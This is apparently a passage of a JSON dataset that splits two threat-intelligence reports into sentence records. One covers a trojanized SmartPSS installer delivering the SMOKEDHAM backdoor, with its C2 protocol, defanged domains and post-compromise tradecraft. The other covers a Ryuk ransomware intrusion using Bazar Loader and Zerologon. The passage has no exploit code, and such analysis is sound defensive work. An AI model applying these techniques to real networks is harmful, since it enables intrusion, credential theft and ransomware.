        "index": 1712
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S0",
        "text": "Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.",
        "type": "",
        "report": "r-711",
        "line": 0,
        "index": 1713
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S1",
        "text": "The downloaded file was extracted to\n",
        "type": "",
        "report": "r-711",
        "line": 1,
        "index": 1714
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S2",
        "text": "Mandiant confirmed the user intended to download, install, and use the SmartPSS software.",
        "type": "",
        "report": "r-711",
        "line": 2,
        "index": 1715
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S3",
        "text": "Figure 2 shows an image of the download page used for SmartPSS software.",
        "type": "",
        "report": "r-711",
        "line": 3,
        "index": 1716
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S4",
        "text": "The installer executable is a Nullsoft installer that when executed wrote two files to C:\\ProgramData\\SMARTPSS-Win32_ChnEng_IS.",
        "type": "",
        "report": "r-711",
        "line": 4,
        "index": 1717
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S5",
        "text": "We were able to extract the malicious installer script and files for analysis using 7-Zip.",
        "type": "",
        "report": "r-711",
        "line": 5,
        "index": 1718
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S6",
        "text": "The relevant section of this installer script is shown below in Figure 3.\n",
        "type": "",
        "report": "r-711",
        "line": 6,
        "index": 1719
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S7",
        "text": "The installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6).",
        "type": "",
        "report": "r-711",
        "line": 7,
        "index": 1720
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S8",
        "text": "The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.",
        "type": "",
        "report": "r-711",
        "line": 8,
        "index": 1721
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S9",
        "text": "The latter is launched with a command line URL executing the content.",
        "type": "",
        "report": "r-711",
        "line": 9,
        "index": 1722
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S10",
        "text": "The smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown.",
        "type": "",
        "report": "r-711",
        "line": 10,
        "index": 1723
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S11",
        "text": "Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.",
        "type": "",
        "report": "r-711",
        "line": 11,
        "index": 1724
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S12",
        "text": "This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy.",
        "type": "",
        "report": "r-711",
        "line": 12,
        "index": 1725
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S13",
        "text": "Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4.\n",
        "type": "",
        "report": "r-711",
        "line": 13,
        "index": 1726
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S14",
        "text": "Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line.\n",
        "type": "",
        "report": "r-711",
        "line": 14,
        "index": 1727
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S15",
        "text": "Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.",
        "type": "",
        "report": "r-711",
        "line": 15,
        "index": 1728
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S16",
        "text": "According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions.",
        "type": "",
        "report": "r-711",
        "line": 16,
        "index": 1729
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S17",
        "text": "The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory.",
        "type": "",
        "report": "r-711",
        "line": 17,
        "index": 1730
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S18",
        "text": "Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.\n",
        "type": "",
        "report": "r-711",
        "line": 18,
        "index": 1731
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S19",
        "text": "At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code.",
        "type": "",
        "report": "r-711",
        "line": 19,
        "index": 1732
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S20",
        "text": "It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant.",
        "type": "",
        "report": "r-711",
        "line": 20,
        "index": 1733
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S21",
        "text": "A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served.",
        "type": "",
        "report": "r-711",
        "line": 21,
        "index": 1734
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S22",
        "text": "Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.\n",
        "type": "",
        "report": "r-711",
        "line": 22,
        "index": 1735
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S23",
        "text": "Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler.\n",
        "type": "",
        "report": "r-711",
        "line": 23,
        "index": 1736
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S24",
        "text": "Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.\n",
        "type": "",
        "report": "r-711",
        "line": 24,
        "index": 1737
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S25",
        "text": "After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.\n",
        "type": "",
        "report": "r-711",
        "line": 25,
        "index": 1738
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S26",
        "text": "The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.",
        "type": "",
        "report": "r-711",
        "line": 26,
        "index": 1739
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S27",
        "text": "The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.",
        "type": "",
        "report": "r-711",
        "line": 27,
        "index": 1740
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S28",
        "text": "The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.",
        "type": "",
        "report": "r-711",
        "line": 28,
        "index": 1741
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S29",
        "text": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "type": "",
        "report": "r-711",
        "line": 29,
        "index": 1742
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S30",
        "text": "The SMOKEDHAM backdoor source code is embedded as an encrypted string.",
        "type": "",
        "report": "r-711",
        "line": 30,
        "index": 1743
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S31",
        "text": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "type": "",
        "report": "r-711",
        "line": 31,
        "index": 1744
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S32",
        "text": "After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.",
        "type": "",
        "report": "r-711",
        "line": 32,
        "index": 1745
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S33",
        "text": "The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.",
        "type": "",
        "report": "r-711",
        "line": 33,
        "index": 1746
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S34",
        "text": "Figure 7 shows the deobfuscated SMOKEDHAM dropper.",
        "type": "",
        "report": "r-711",
        "line": 34,
        "index": 1747
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S35",
        "text": "SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.",
        "type": "",
        "report": "r-711",
        "line": 35,
        "index": 1748
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S36",
        "text": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.",
        "type": "",
        "report": "r-711",
        "line": 36,
        "index": 1749
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S37",
        "text": "SMOKEDHAM communicates with its C2 server using HTTPS.",
        "type": "",
        "report": "r-711",
        "line": 37,
        "index": 1750
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S38",
        "text": "The backdoor uses domain fronting to obfuscate its true C2 server.",
        "type": "",
        "report": "r-711",
        "line": 38,
        "index": 1751
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S39",
        "text": "The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.",
        "type": "",
        "report": "r-711",
        "line": 39,
        "index": 1752
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S40",
        "text": "Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.",
        "type": "",
        "report": "r-711",
        "line": 40,
        "index": 1753
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S41",
        "text": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
        "type": "",
        "report": "r-711",
        "line": 41,
        "index": 1754
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S42",
        "text": "The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.",
        "type": "",
        "report": "r-711",
        "line": 42,
        "index": 1755
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S43",
        "text": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "type": "",
        "report": "r-711",
        "line": 43,
        "index": 1756
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S44",
        "text": "The ID field contains a unique value generated by the backdoor for the target system.\n",
        "type": "",
        "report": "r-711",
        "line": 44,
        "index": 1757
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S45",
        "text": "The UUID field may contain a unique value used to track command output or be empty.",
        "type": "",
        "report": "r-711",
        "line": 45,
        "index": 1758
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S46",
        "text": "When the C2 server responds with a command to execute, it sets the UUID field to a unique value.",
        "type": "",
        "report": "r-711",
        "line": 46,
        "index": 1759
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S47",
        "text": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.",
        "type": "",
        "report": "r-711",
        "line": 47,
        "index": 1760
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S48",
        "text": "The Data field may contain RC4-encrypted, Base64-encoded command data or be empty.",
        "type": "",
        "report": "r-711",
        "line": 48,
        "index": 1761
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S49",
        "text": "The backdoor uses the Data field to send command output to its C2 server.",
        "type": "",
        "report": "r-711",
        "line": 49,
        "index": 1762
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S50",
        "text": "The C2 server uses the Data field to send commands to the backdoor to execute.",
        "type": "",
        "report": "r-711",
        "line": 50,
        "index": 1763
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S51",
        "text": "The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.",
        "type": "",
        "report": "r-711",
        "line": 51,
        "index": 1764
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S52",
        "text": "Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.",
        "type": "",
        "report": "r-711",
        "line": 52,
        "index": 1765
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S53",
        "text": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "type": "",
        "report": "r-711",
        "line": 53,
        "index": 1766
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S54",
        "text": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.\n",
        "type": "",
        "report": "r-711",
        "line": 54,
        "index": 1767
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S55",
        "text": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "type": "",
        "report": "r-711",
        "line": 55,
        "index": 1768
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S56",
        "text": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "type": "",
        "report": "r-711",
        "line": 56,
        "index": 1769
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S57",
        "text": "In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",
        "type": "",
        "report": "r-711",
        "line": 57,
        "index": 1770
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S58",
        "text": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.\n",
        "type": "",
        "report": "r-711",
        "line": 58,
        "index": 1771
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S59",
        "text": "SMOKEDHAM was observed executing commands on the target system using PowerShell.\n",
        "type": "",
        "report": "r-711",
        "line": 59,
        "index": 1772
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S60",
        "text": "The following commands were used to collect information about the system and logged in users.\n",
        "type": "",
        "report": "r-711",
        "line": 60,
        "index": 1773
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S61",
        "text": "- net.exe user net.exe users\n",
        "type": "",
        "report": "r-711",
        "line": 61,
        "index": 1774
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S62",
        "text": "- whoami.exe whoami.exe /priv systeminfo.exe\n",
        "type": "",
        "report": "r-711",
        "line": 62,
        "index": 1775
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S63",
        "text": "The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.\n",
        "type": "",
        "report": "r-711",
        "line": 63,
        "index": 1776
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S64",
        "text": "The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication.",
        "type": "",
        "report": "r-711",
        "line": 64,
        "index": 1777
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S65",
        "text": "Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.\n",
        "type": "",
        "report": "r-711",
        "line": 65,
        "index": 1778
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S66",
        "text": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "type": "",
        "report": "r-711",
        "line": 66,
        "index": 1779
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S67",
        "text": "These files were saved to the %APPDATA%\\Chrome\\ directory.",
        "type": "",
        "report": "r-711",
        "line": 67,
        "index": 1780
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S68",
        "text": "The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1.\n",
        "type": "",
        "report": "r-711",
        "line": 68,
        "index": 1781
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S69",
        "text": "SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.",
        "type": "",
        "report": "r-711",
        "line": 69,
        "index": 1782
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S70",
        "text": "SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.\n",
        "type": "",
        "report": "r-711",
        "line": 70,
        "index": 1783
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S71",
        "text": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "type": "",
        "report": "r-711",
        "line": 71,
        "index": 1784
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S72",
        "text": "These files were stored in the C:\\ProgramData\\WindNT\\ directory.",
        "type": "",
        "report": "r-711",
        "line": 72,
        "index": 1785
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S73",
        "text": "NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.",
        "type": "",
        "report": "r-711",
        "line": 73,
        "index": 1786
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S74",
        "text": "The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.",
        "type": "",
        "report": "r-711",
        "line": 74,
        "index": 1787
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S75",
        "text": "SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.\n",
        "type": "",
        "report": "r-711",
        "line": 75,
        "index": 1788
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S76",
        "text": "This attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe.",
        "type": "",
        "report": "r-711",
        "line": 76,
        "index": 1789
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S77",
        "text": "The keylogging utility was configured to capture and record keystrokes to C:\\ProgramData\\psh\\System32Log.txt.\n",
        "type": "",
        "report": "r-711",
        "line": 77,
        "index": 1790
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S78",
        "text": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "type": "",
        "report": "r-711",
        "line": 78,
        "index": 1791
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S79",
        "text": "The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations:\n",
        "type": "",
        "report": "r-711",
        "line": 79,
        "index": 1792
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S80",
        "text": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "type": "",
        "report": "r-711",
        "line": 80,
        "index": 1793
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S81",
        "text": "Update.exe was a Go based dropper created using the ScareCrow framework.",
        "type": "",
        "report": "r-711",
        "line": 81,
        "index": 1794
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S82",
        "text": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.\n",
        "type": "",
        "report": "r-711",
        "line": 82,
        "index": 1795
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S83",
        "text": "The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.",
        "type": "",
        "report": "r-711",
        "line": 83,
        "index": 1796
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S84",
        "text": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "type": "",
        "report": "r-711",
        "line": 84,
        "index": 1797
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S85",
        "text": "Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload.\n",
        "type": "",
        "report": "r-711",
        "line": 85,
        "index": 1798
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S86",
        "text": "Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\ directory.\n",
        "type": "",
        "report": "r-711",
        "line": 86,
        "index": 1799
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S87",
        "text": "From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections.",
        "type": "",
        "report": "r-711",
        "line": 87,
        "index": 1800
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S0",
        "text": "In our previous Ryuk case, we saw the threat actors leverage access to an environment via the Bazar Loader malware.",
        "type": "",
        "report": "r-740",
        "line": 0,
        "index": 1801
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S1",
        "text": "This time around, we saw them accomplish their objective faster, but the general tactics and techniques stayed similar between incidents.",
        "type": "",
        "report": "r-740",
        "line": 1,
        "index": 1802
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S2",
        "text": "Bazar was introduced to the environment again with the delivery via phishing emails.",
        "type": "",
        "report": "r-740",
        "line": 2,
        "index": 1803
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S3",
        "text": "For an in depth breakdown on this loader, see this analysis by Roman Marshanski & Vitali Kremez.",
        "type": "",
        "report": "r-740",
        "line": 3,
        "index": 1804
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S4",
        "text": "Bazar, once running, was seen again injecting into explorer.exe, svchost.exe, and spawning command shell processes.",
        "type": "",
        "report": "r-740",
        "line": 4,
        "index": 1805
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S5",
        "text": "From this loader we saw initial mapping of the domain, using built-in windows utilities such as Nltest.",
        "type": "",
        "report": "r-740",
        "line": 5,
        "index": 1806
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S6",
        "text": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "type": "",
        "report": "r-740",
        "line": 6,
        "index": 1807
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S7",
        "text": "Lateral movement was initiated via SMB file transfers and WMI executions of Cobalt Strike Beacons.",
        "type": "",
        "report": "r-740",
        "line": 7,
        "index": 1808
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S8",
        "text": "The network indicators align similarly to the prior campaign and were noted by Kyle Ehmke in response to our last post pivoting off the prior report\u2019s intel.",
        "type": "",
        "report": "r-740",
        "line": 8,
        "index": 1809
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S9",
        "text": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "type": "",
        "report": "r-740",
        "line": 9,
        "index": 1810
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S10",
        "text": "Both portable executable and DLL beacons were used.",
        "type": "",
        "report": "r-740",
        "line": 10,
        "index": 1811
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S11",
        "text": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
        "type": "",
        "report": "r-740",
        "line": 11,
        "index": 1812
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S12",
        "text": "From there, the threat actors appeared to use the default named pipe privilege escalation module on the server.",
        "type": "",
        "report": "r-740",
        "line": 12,
        "index": 1813
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S13",
        "text": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
        "type": "",
        "report": "r-740",
        "line": 13,
        "index": 1814
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S14",
        "text": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
        "type": "",
        "report": "r-740",
        "line": 14,
        "index": 1815
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S15",
        "text": "Then more domain reconnaissance was performed using AdFind.",
        "type": "",
        "report": "r-740",
        "line": 15,
        "index": 1816
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S16",
        "text": "Once this completed, at the four hour mark, the threat actors were ready for their final objective.\n",
        "type": "",
        "report": "r-740",
        "line": 16,
        "index": 1817
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S17",
        "text": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
        "type": "",
        "report": "r-740",
        "line": 17,
        "index": 1818
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S18",
        "text": "Backup servers were again targeted first for deployment of the ransomware executable, followed by servers and then workstations.",
        "type": "",
        "report": "r-740",
        "line": 18,
        "index": 1819
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S19",
        "text": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.\n",
        "type": "",
        "report": "r-740",
        "line": 19,
        "index": 1820
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S20",
        "text": "While last time we commented on the lead time between the first and second day to aid detection and response activity, this case goes to show that you can\u2019t count on that kind of timescale.",
        "type": "",
        "report": "r-740",
        "line": 20,
        "index": 1821
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S21",
        "text": "You need to be ready to act in less than an hour, to make sure you can effectively disrupt the threat actor.",
        "type": "",
        "report": "r-740",
        "line": 21,
        "index": 1822
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S22",
        "text": "Access was initiated by a phishing email leading to the Bazar Loader malware executable.\n",
        "type": "",
        "report": "r-740",
        "line": 22,
        "index": 1823
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S23",
        "text": "Bazar relies on user execution of an executable to run.",
        "type": "",
        "report": "r-740",
        "line": 23,
        "index": 1824
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S24",
        "text": "This user was a Domain User and did not have any other permissions.\n",
        "type": "",
        "report": "r-740",
        "line": 24,
        "index": 1825
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S25",
        "text": "CVE-2020-1472 was used to reset the credentials on one of the domain controllers in the environment.",
        "type": "",
        "report": "r-740",
        "line": 25,
        "index": 1826
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S26",
        "text": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.\n",
        "type": "",
        "report": "r-740",
        "line": 26,
        "index": 1827
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S27",
        "text": "Packet showing the zeroed out password.\n",
        "type": "",
        "report": "r-740",
        "line": 27,
        "index": 1828
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S28",
        "text": "On one of the domain controllers we saw use of the Cobalt Strike named pipe escalation.\n",
        "type": "",
        "report": "r-740",
        "line": 28,
        "index": 1829
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S29",
        "text": "On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.\n",
        "type": "",
        "report": "r-740",
        "line": 29,
        "index": 1830
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S30",
        "text": "Dropped via RDP and executed via rundll32 on the second domain controller.\n",
        "type": "",
        "report": "r-740",
        "line": 30,
        "index": 1831
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S31",
        "text": "Shortly after, the DLL was called again via regsrv32.\n",
        "type": "",
        "report": "r-740",
        "line": 31,
        "index": 1832
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S32",
        "text": "Then a 2nd DLL was dropped and executed in a similar manner on the 2nd DC.\n",
        "type": "",
        "report": "r-740",
        "line": 32,
        "index": 1833
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S33",
        "text": "Ran on the beachhead.\n",
        "type": "",
        "report": "r-740",
        "line": 33,
        "index": 1834
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S34",
        "text": "Ran on a domain controller.\n",
        "type": "",
        "report": "r-740",
        "line": 34,
        "index": 1835
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S35",
        "text": "Then they imported the PowerShell Active Directory module.\n",
        "type": "",
        "report": "r-740",
        "line": 35,
        "index": 1836
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S36",
        "text": "They then ran the following looking for host names, operating systems and last logon dates of all AD systems.\n",
        "type": "",
        "report": "r-740",
        "line": 36,
        "index": 1837
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S37",
        "text": "After already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "type": "",
        "report": "r-740",
        "line": 37,
        "index": 1838
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S38",
        "text": "Contents of the script ran the following with AdFind.\n",
        "type": "",
        "report": "r-740",
        "line": 38,
        "index": 1839
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S39",
        "text": "The threat actor then ran this command a few times.\n",
        "type": "",
        "report": "r-740",
        "line": 39,
        "index": 1840
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S40",
        "text": "The first lateral movement occurred to the domain controller not affected by the use of CVE-2020-1472.",
        "type": "",
        "report": "r-740",
        "line": 40,
        "index": 1841
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S41",
        "text": "An executable was transferred to it via SMB using a domain administrator account.\n",
        "type": "",
        "report": "r-740",
        "line": 41,
        "index": 1842
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S42",
        "text": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.\n",
        "type": "",
        "report": "r-740",
        "line": 42,
        "index": 1843
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S43",
        "text": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.\n",
        "type": "",
        "report": "r-740",
